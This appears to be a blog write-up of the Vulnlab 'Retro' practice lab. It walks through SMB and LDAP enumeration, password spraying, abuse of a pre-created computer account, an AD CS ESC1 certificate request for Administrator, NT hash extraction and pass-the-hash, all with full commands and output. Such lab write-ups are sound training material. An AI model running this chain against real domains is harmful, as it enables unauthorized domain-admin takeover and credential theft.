---
title: "Vulnlab : Retro Easy"
date: 2025-10-16T21:07:38+02:00
draft: false
toc: false
images:
tags:
  - misc
---
This easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.
## Reconnaissance

```bash
network scan: 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 17:57:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can see from the nmap scan the use of LDAPS, which could indicate the use of AD CS. This service allows the creation of a PKI to issue certificates.
### SMB enumeration

```bash
[Oct 14, 2025 - 20:12:32 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u '' -p '' --shares
SMB         10.10.98.67     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.98.67     445    DC               [+] retro.vl\:
SMB         10.10.98.67     445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

[Oct 14, 2025 - 20:13:13 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u 'test' -p '' --shares
SMB         10.10.98.67     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.98.67     445    DC               [+] retro.vl\test: (Guest)
SMB         10.10.98.67     445    DC               [*] Enumerated shares
SMB         10.10.98.67     445    DC               Share           Permissions     Remark
SMB         10.10.98.67     445    DC               -----           -----------     ------
SMB         10.10.98.67     445    DC               ADMIN$                          Remote Admin
SMB         10.10.98.67     445    DC               C$                              Default share
SMB         10.10.98.67     445    DC               IPC$            READ            Remote IPC
SMB         10.10.98.67     445    DC               NETLOGON                        Logon server share
SMB         10.10.98.67     445    DC               Notes
SMB         10.10.98.67     445    DC               SYSVOL                          Logon server share
SMB         10.10.98.67     445    DC               Trainees        READ

[Oct 14, 2025 - 20:17:35 (CEST)] exegol-vulnlab /workspace # smbclient //10.10.98.67/Trainees -U "dhgdgej"

Password for [WORKGROUP\dhgdgej]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 23:58:43 2023
  ..                                DHS        0  Wed Jul 26 11:54:14 2023
  Important.txt                       A      288  Mon Jul 24 00:00:13 2023

		6261499 blocks of size 4096. 2892582 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \> exit
[Oct 14, 2025 - 20:17:45 (CEST)] exegol-vulnlab /workspace # cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

We can see the existence of a trainee account for multiple users, with a unique password.
### User enumeration

```bash
enum users: nxc smb 10.10.108.91 -u 'kfhfkhfkgh' -p '' --rid-brute --log users.txt

create user file: cat users.txt | awk '{print $13}' | cut -d '\' -f 2 | sed -n 29,33p > users.txt

[Oct 14, 2025 - 20:18:50 (CEST)] exegol-vulnlab /workspace # cat users.txt
trainee
BANKING$
jburley
HelpDesk
tblack
```

Now we have a list of users. Searching in LDAP, I didn't find any trivial passwords. So we'll check if any user might be using an empty password or a password identical to their username.

```bash
[Oct 14, 2025 - 20:19:27 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u users.txt -p '' --no-bruteforce --continue-on-success
SMB         10.10.98.67     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.98.67     445    DC               [-] retro.vl\trainee: STATUS_LOGON_FAILURE
SMB         10.10.98.67     445    DC               [-] retro.vl\BANKING$: STATUS_LOGON_FAILURE
SMB         10.10.98.67     445    DC               [-] retro.vl\jburley: STATUS_LOGON_FAILURE
SMB         10.10.98.67     445    DC               [+] retro.vl\HelpDesk: (Guest)
SMB         10.10.98.67     445    DC               [-] retro.vl\tblack: STATUS_LOGON_FAILURE

[Oct 14, 2025 - 20:20:26 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.10.98.67     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.98.67     445    DC               [+] retro.vl\trainee:trainee
SMB         10.10.98.67     445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE
SMB         10.10.98.67     445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE
SMB         10.10.98.67     445    DC               [+] retro.vl\HelpDesk:HelpDesk (Guest)
SMB         10.10.98.67     445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE
```

I tried, just in case, to see if we could get an interactive session with the credentials we found.

```bash
[Oct 14, 2025 - 20:31:30 (CEST)] exegol-vulnlab /workspace # evil-winrm -i 10.10.98.67 -u 'trainee' -p 'trainee'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

It seems not, so I'll check if this user unlocks more permissions on SMB shares.

```bash
[Oct 14, 2025 - 20:32:36 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u 'trainee' -p 'trainee' --shares
SMB         10.10.98.67     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.98.67     445    DC               [+] retro.vl\trainee:trainee
SMB         10.10.98.67     445    DC               [*] Enumerated shares
SMB         10.10.98.67     445    DC               Share           Permissions     Remark
SMB         10.10.98.67     445    DC               -----           -----------     ------
SMB         10.10.98.67     445    DC               ADMIN$                          Remote Admin
SMB         10.10.98.67     445    DC               C$                              Default share
SMB         10.10.98.67     445    DC               IPC$            READ            Remote IPC
SMB         10.10.98.67     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.98.67     445    DC               Notes           READ
SMB         10.10.98.67     445    DC               SYSVOL          READ            Logon server share
SMB         10.10.98.67     445    DC               Trainees        READ
```

We have read access to the Notes share.

```bash
[Oct 14, 2025 - 20:34:14 (CEST)] exegol-vulnlab /workspace # smbclient //10.10.98.67/Notes -U "trainee"
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 24 00:03:16 2023
  ..                                DHS        0  Wed Jul 26 11:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023

		6261499 blocks of size 4096. 2891768 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> exit
[Oct 14, 2025 - 20:34:35 (CEST)] exegol-vulnlab /workspace # cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancient banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

We can see that the company uses pre-created computers. If we refer to this [blog post](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts), if we find a computer with this attribute, its password will be the same as its name in lowercase.

In the user list we created earlier, we can see an account with a computer name (BANKING$), let's check if this is indeed the case.

```bash
[Oct 14, 2025 - 20:51:55 (CEST)] exegol-vulnlab /workspace # nxc ldap 10.10.98.67 -u 'trainee' -p 'trainee' --query "(ObjectClass=user)" "*" | grep Computers
LDAP                     10.10.98.67     389    DC               [+] Response for object: CN=banking,CN=Computers,DC=retro,DC=vl
LDAP                     10.10.98.67     389    DC               distinguishedName    CN=banking,CN=Computers,DC=retro,DC=vl
```

Ok, now we potentially have a computer account. Let's verify this:

```bash
[Oct 16, 2025 - 21:38:13 (CEST)] exegol-vulnlab /workspace # nxc smb 10.10.98.67 -u 'banking$' -p 'banking'
SMB         10.10.121.126   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.121.126   445    DC               [-] retro.vl\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Now, I think we should explore the possibility of a vulnerability with AD CS, such as a misconfiguration of a certificate template.

```bash
[Oct 14, 2025 - 20:49:36 (CEST)] exegol-vulnlab /workspace # nxc ldap 10.10.98.67 -u 'trainee' -p 'trainee' -M adcs
LDAP        10.10.98.67     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
LDAP        10.10.98.67     389    DC               [+] retro.vl\trainee:trainee
ADCS        10.10.98.67     389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.98.67     389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.10.98.67     389    DC               Found CN: retro-DC-CA
```

Ok, with nxc's adcs module we can indeed see that the DC also acts as an enrollment server.
We will now look for vulnerable templates with certipy.

```bash
[Oct 14, 2025 - 20:54:05 (CEST)] exegol-vulnlab /workspace # certipy find -u 'trainee@retro.vl' -p 'trainee' -dc-ip '10.10.98.67' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Perfect! We have a privilege escalation possibility with ESC1. This vulnerability allows a regular domain user to become domain admin.
## Exploitation and Privilege Escalation

ESC1 is a combination of several misconfigurations:
- The Enterprise CA grants low-privileged users enrollment rights.
- No authorized signatures are required.
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- Manager approval is disabled.
- The certificate template defines EKUs that enable authentication.
- The certificate template allows requesters to specify a subjectAltName in the CSR.

To exploit this vulnerability we need a computer account on the domain. Fortunately, we found a pre-created computer earlier. With this we can request a Kerberos ticket, which we can use to perform a pass-the-ticket attack with certipy to request a certificate with the UPN 'Administrator'. This certificate will allow us to obtain the Administrator's TGT to extract the Administrator's NT hash from the ticket and use this hash in a pass-the-hash attack.

```bash
// get TGT of BANKING$
[Oct 14, 2025 - 21:09:25 (CEST)] exegol-vulnlab /workspace # getTGT.py -dc-ip 10.10.98.67 'retro.vl/banking$:banking'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in banking$.ccache
[Oct 14, 2025 - 21:11:05 (CEST)] exegol-vulnlab /workspace # export KRB5CCNAME=banking\$.ccache
[Oct 14, 2025 - 21:12:48 (CEST)] exegol-vulnlab /workspace # klist
Ticket cache: FILE:banking$.ccache
Default principal: banking$@RETRO.VL

Valid starting       Expires              Service principal
10/14/2025 21:10:33  10/15/2025 07:10:33  krbtgt/RETRO.VL@RETRO.VL
	renew until 10/15/2025 21:10:35

// request administrator certificate 
[Oct 14, 2025 - 21:16:44 (CEST)] exegol-vulnlab /workspace # certipy req -k -no-pass -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

// get NT hash of the administrator
[Oct 14, 2025 - 21:18:01 (CEST)] exegol-vulnlab /workspace # certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389

// pass-the-hash
[Oct 14, 2025 - 21:19:34 (CEST)] exegol-vulnlab /workspace # wmiexec.py administrator@10.10.98.67 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

We are now connected as admin and can get the flag.

Thanks for reading!
